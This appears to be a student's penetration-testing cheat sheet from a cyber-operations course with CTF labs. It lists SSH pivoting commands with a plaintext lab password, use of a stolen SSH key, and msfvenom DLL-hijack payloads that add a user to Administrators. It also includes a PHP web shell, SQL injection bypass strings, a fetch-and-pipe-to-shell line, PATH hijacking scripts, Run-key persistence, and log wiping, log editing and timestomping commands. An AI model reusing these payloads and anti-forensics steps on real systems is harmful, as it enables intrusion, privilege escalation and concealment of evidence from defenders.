## MASTER SOCKETS AND FORWARDING
```
ssh -MS /tmp/jmp student@10.50.16.159
```
> jump pass
```
Cor6Nmd25ubE
```
> <sub> initial master socket to jump box <sub>
```
ssh -S /tmp/jmp jmp -O forward -L 21100:192.168.28.100:2222
```
> <sub> from the jump box to the target 1 <sub>
```
ssh -S /tmp/jmp jmp -O forward -D 9050
```
> <sub> dynamic port open <sub>
```
ssh -S /tmp/jmp jmp -O cancel -D 9050
```
> <sub> dynamic port close <sub>
##### TUNNEL TO T1
```
ssh -p21100 -MS /tmp/t1 www-data@127.0.0.1
```
> <sub> mew master socket starting at target 1, referncing previously made port from the first port forward <sub>
```
ssh -S /tmp/t1 t1 -O forward -L 21101:192.168.150.253:3201
```
> <sub> port forward from target 1 to the NEXT ip <sub>
```
ssh -S /tmp/t1 t1 -O forward -D 9050
```
> <sub> dynamic port open <sub>
```
ssh -S /tmp/t1 t1 -O cancel -D 9050
```
> <sub> dynamic port close <sub>

##### TUNNEL TO TARGET AFTER T1
``` 
ssh -p21101 -MS /tmp/intra comrade@127.0.0.1
```
> <sub> new master socket to the NEXT BOX <sub>
```
ssh -S /tmp/intra intra -O forward -D 9050
```
> <sub> dynamic port open <sub>
```
ssh -S /tmp/intra intra -O cancel -D 9050 
```
> <sub> dynamic port close <sub>



## STOLEN KEY
```
chmod 600 /home/user/stolenkey   
```
> <sub>done on linops BEFORE ATTEMPTING to use the key in ssh command <sub>
> <sub>IF YOU ACCIDENTALLY SKIP THIS STEP, RENAME the key file, chmod it and move on <sub>
```
ssh -i /home/user/stolenkey bigj@10.20.30.40
```

## RDP FROM LINUX (XFREERDP)
```
proxychains xfreerdp /u:comrade /p:StudentMidwayPassword /v:192.168.28.9 /clipboard
```

## PING SWEEP COMMAND (ON TARGET)
```
for i in {1..255}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done
```

## HTTP ENUM SCRIPT
```
proxychains nmap --script=http-enum <IP>
```
# WINDOWS PRIVILEGE ESCALATION

#### DLL SEARCH ORDER
```
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
```
#### CHECK UAC SETTINGS
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```

# AS INVOKER ??? ASK A QUESTION

# PRIVELEGE ESCALATION LOCATIONS

### SCHEDULED TASKS

#### The following commands can be used to idenitfy vulnerable tasks using CMD and PowerShell:
```
schtasks /query /fo LIST /v``   # List all Tasks in List format
schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"
```
# ASK ABOUT THE RELEVANCE OF THESE
```
schtasks.exe /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6``
   # Searches for *Task To Run* and outputs that line, along with the 6 lines following it in order to show the *Run As User* setting too.
schtasks.exe /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch``
   # Excludes results that we dont want to seein order to help narrow down vulnerable directory locations
   # Open and view tasks from the Task Scheduler GUI Application
```

# ADD IN PUTTTY.EXE NOTES


# RELEVANCE ?????
#### WINDOWS REGISTRY 
```
New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -name "Updater" -PropertyType expandstring -value 'C:\Windows\System32\cmd.exe /c calc.exe' -force
```


## MOST IMPORTANT REGISTRY KEYS
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
```
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```

# SERVIES
## CLIKC ON THE DESCRIPTION TAB AND SORT TO FIND THE SERVICE WITH NO DESCRIPTION, EVENTUALY THE EMPTY ONES WILL GO TO THE TOP
## EMPTY DESCRIPTIONS AND MISPELLINGS
## WEIRD EXECUTABLE

COPY PATH TO EXECUTABLE AND PASTE INTO FILE EXPLORER, LOOK FOR OTHER ARTFACTS IN THAT SAME DIRECTORY
ALSO IN FILE EXPLORER MAKE SURE TO TAKE A QUICK GLANCE AT THE HIDDEN FOLDERS 
   VIEW ---> [ CHECK ] HIDDEN ITEMS

CHANGE THE SORT TO FIND THE FEWEST 

we'll b e woring off the run more often than not becuase we want it to run every time, 

# audtipol /get /category:* findstr /i "success failure"
   make sure to run as an administrator


# SCHEDULED TASKS
## TAKE A LOOK AT THE TRIGGERS - WHAT CAUSES IT
## TAKE A LOOK AT THE ACTIONS - WHAT IS GOING ON


GIVEN AN EXECUTBALE

CONSISTENT THING IN REG OR SCHTASKS

RENAME OLD EXEC TO RANDOM - RENAME THE NEW AS THE OLD THATS SCHEDUELD TO RUN



# LOG ITEMS IS EVENT VIEWER

WINDOWS LOGS, RIGHT CLICK, PROPERTIES.

CREATE (CHANGE TIME SET)  ANY TIME --> CUSTOM RANGE, CHANGE TIME AND DATES TO MATCH WHAT YOURE LOOKING FOR


in linops
```
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\Student\Desktop\whoami.txt' -f dll > SSPICLI.dll
```
### move the .dll into the the directory with the 
### if a mistake is made, DELETE the .dll in the file you saved it in AND RENAME the .dll file on the windows machine and try again.

## CTF excerise 
to find list the contents of the directory where the flag is, anne_swer.txt
```
msfvenom -p windows/exec CMD='cmd.exe /C "dir C:\Users\Admin\Desktop" > C:\Users\Public\Documents\anne_swer.txt' -f dll > hijackmeplz.dll
```
this gives final flag output in anne_swer2.txt
```
msfvenom -p windows/exec CMD='cmd.exe /C "type C:\Users\Admin\Desktop\flag.txt" > C:\Users\Public\Documents\anne_swer2.txt' -f dll > hijackmeplz.dll
```
from windows RDP Session, command prompt, navigate to C:\Users\Public\Documents
```
cd C:\Users\Public\Documents
```
```
scp student@<linopsIP>:/home/student/SSPICLI.dll .
```
copy and paste the .dll into the directory with the executable

restart the windows in the rdp session
```
msfvenom -p windows/exec CMD='cmd.exe /C "net localgroup {Group} /add {username}" -f dll > hijackmeplz.dll
```
```
msfvenom -p windows/exec CMD='cmd.exe /C "net localgroup Administrators comrade /add"' -f dll > hijackmeplz.dll
```
# gunny pastables 

Survey/Current system enumuration
```
whoami 
```
```
uname -a
```
```
ifconfig -a
```
```
hostname
```
```
netstat -antup
```
```
arp -an
```
```
cat /etc/hosts
```
```
ps -elf
```
```
ps -elf | grep syslog
```
```
find / -name password* 2>/dev/null
```
## Locations of interest
```
cat /etc/hosts
```
```
cat /etc/passwd
```
```
ls /etc/rsys*
```
```
ls -lisa /
```
```
ls -lisa /tmp
```
```
ls -lisa /home
```
```
sudo -l
```
```
ls -lisa /etc/cron*
```

# RECON
```
for i in {1..254} ;do (ping -c 1 192.168.28.$i} | grep "bytes from" &) ;done
```
```
proxychains nmap -sT -Pn -T5 <ips>
```
```
sudo nmap -Pn -sS -T5 <IP>
```
```
Webserver:
    nmap --script http-enum <WebserverIP>
```
```
nmap -p445 --script smb-os-discovery <target>
```
from firefox 
```
<webserverIP>/robots.txt
```

# Masquerade


```
echo "<sshPublicKey>" > <home>/.ssh/authorized_keys
```
```
cat <home>/.ssh/authorized_keys
```
```
ssh -i <stolen_key> <TargetIP>
```
```    
SQL (Golden Statement)
```
```
             column, column, column FROM database.table
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns

```


# things to try on we browserses 
cross site scripting(just try) 
```
; <your command>
```
### directory transversal(just try), go to the "loacations of interest" section on this git
```
../../../../../../../etc/passwd
```
### malicouse upload(must be able to upload and locate a file)
```

<HTML><BODY>
<FORM METHOD="GET"  NAME="myform" ACTION="">
<INPUT TYPE="text" NAME= "cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
system($_GET['cmd'])'
}
?> 
</pre>
</BODY></HTML>

```
when you make a html script and upload it to the browser, insure you save it as a .html

authentication bypass, in Both username and password fields
```
'OR 1='1
```
for further authentication, before you hit enter and log in using the auth bypass do this
```
inspect Q > network > (now hit enter) > click on the POST method > request> raw > (copy the raw string and add it the the end of the php url, but make sure you add a question mark behind the php)
```

# what is sudo, how we use it?
SUDO stands for super user do, it gives the runner temp access to admin privlages

# commands to run for linux privilege escalation
tells you what you can run with higher privlages, should be first command you run on new machine
```
sudo -l
```

#### danger commadands
downloads files from a web or file server
```
sudo wget http://malicious_source -O- | sh
```
# what is SUID/SGID, how do we use it?
this allows you to run a file as the user or group that owns that file
### commands to run 
search for SUID
```
find / -type f -perm /4000 -ls 2>/dev/null
```
search for SGUID
```
find / -type f -perm /2000 -ls 2>/dev/null
```
search for rboth SUID and SGUID
```
find / -type f -perm /6000 -ls 2>/dev/null
```

**GTFO Bins** Reference Website, Guide on how to abuse misconfigurations 
  _this is used to check the SUID/SGUID commands you found for vulnurabilities _
```
GTFO Bins: https://gtfobins.github.io/gtfobins/tcpdump/
```

# World-Writables, why we use em?
is a directory with univeral write commands such as /tmp
we can use this to write to files we usually wouldnt have access to write too
this would overwite the 'cat' commadn in our tmp direcotry 
```
touch ls
vim ls
#!/bin/bash
echo "mew mew mew"

```
# DOT'.' PATH, why we use it?
pur path is the order of the locations that the system wil check for commands
some lazy admins will add a literal '.' to the sytem path using this command
```
PATH=.:$PATH
```
to read the current path use 
```
echo $PATH
```
if you know a user is going into /tmp and running a specific command. you can create this script and name it <CMD they are running> . this will force them to run your ls script instead of the /bin/ls cmd. 
```
#!/bin/bash 

cd ;ls -lisha | cat * > /tmp/shadow.txt
```
# WORKING WITH LOGS

TO CLEAR THE LOG
```
cat /dev/null > /var/log/...
echo > /var/log/...
```
TO REMOVE THE LOG 
```
rm -rf /var/log/...
```
CLEANING LOGS 
GREP (REMOVE)
```
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2

```
SED (REPLACE) 
```
cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
```

# WORKING WITH TIMESTOMP 
```
touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference
```


# WORKING WITH REMOTE LOGGING 
.Check the config!

.Identify server being shipped to!

.Identify which logs are being shipped

.Rsyslog? Need to be thorough!

.New version references multiple files for rules
  
.Check current running proccesses for any process related to remote logging



# Rsyslog 

Newer Rsyslog references; /etc/rsyslog.d/* for settings/rules

Older version only uses; /etc/rsyslog.conf

## Find out
```
grep "IncludeConfig" /etc/rsyslog.conf
```
## Reading Rsyslog
Utilizes severity (priority) and facility levels

Rules filter out, and can use keyword or number
```
<facility>.<priority>
```
Rsyslog Examples
```
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*.*  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*
```

cd C:\Users\student\Downloads\Demo 1
 #-a for ascii, findtr /i for case insensintivity

strings.exe -a -nobanner .\demo1_new.exe | findstr /i enter

#useful for finding what OS to run it on

strings.exe -a -nobanner .\demo1_new.exe | select -first 10

#Behavioral analysis

run program as intended

##skipping Dynamic 





# disassembly

## open ghidra
 ```
  new project> click  file > import file 
```
by default: functions, dissasembler, decompiler 

# start at the end of the program, search for "success" or any disired string
``` 
 search > strings: search for desired string and than double click results to see c 
```
# patching  

follow the code, working backwords and identify potential instructions or values to be changed

right click on instruction value, click patch instruction, then put a new value in

then save your changes to a new file under a diferent name
```
File  > export program > format PE > change location > save > run
```


# edit these and go more in depth 

event viewer 

services

audit pol as admin 

file exploere > hidden

reg edit

task schedular 

key upload through malware
```
./unknown /root/.ssh/authorized_keys <lin-ops key>
```
